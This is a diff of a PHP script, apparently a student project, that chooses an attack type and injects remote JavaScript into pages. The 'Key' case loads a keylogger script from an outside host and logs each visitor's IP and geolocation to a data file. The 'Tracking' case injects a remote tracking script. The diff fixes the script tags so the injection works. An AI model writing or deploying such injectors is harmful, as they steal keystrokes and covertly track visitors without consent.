@@ -7,7 +7,7 @@ $textToInsert="";
 switch($typeOfAttack){
     case "Key":
           $keyloggerscript = "http://individualproject.esy.es/js/keylogger.js";
-          $textToInsert="script type='text/javascript' src='$keyloggerscript'</script>";
+          $textToInsert="<script type='text/javascript' src='$keyloggerscript'</script>";
           //GETTING IP AND ADDING IT TO DATA.TXT ON SERVER
           $ip = getenv('HTTP_CLIENT_IP')?:
           getenv('HTTP_X_FORWARDED_FOR')?:
@@ -16,7 +16,7 @@ switch($typeOfAttack){
           getenv('HTTP_FORWARDED')?:
           getenv('REMOTE_ADDR');
           //depends on location / this ip for good result 12.215.42.19 ;
-           $data = file_get_contents("http://api.hostip.info/get_html.php?ip='$ip'&position=true")." Says </br>";
+           $data = file_get_contents("http://api.hostip.info/get_html.php?ip='$ip'&position=true")." Says <br>";
            $logfile = fopen('../php/data.txt', 'a+');
            fwrite($logfile, $data );
            fclose($logfile);
@@ -35,13 +35,12 @@ switch($typeOfAttack){
           break;
 
     case "Cryptography":
-
           runCryptographyScript($privateKey);
           break;
 
     case "Tracking":
           $TrackingScript = "http://individualproject.esy.es/js/tracking.js";
-          $textToInsert="script type='text/javascript' src='$TrackingScript'</script>";
+          $textToInsert="<script type='text/javascript' src='$TrackingScript'</script>";
           runScript($textToInsert);
           break;
     default:
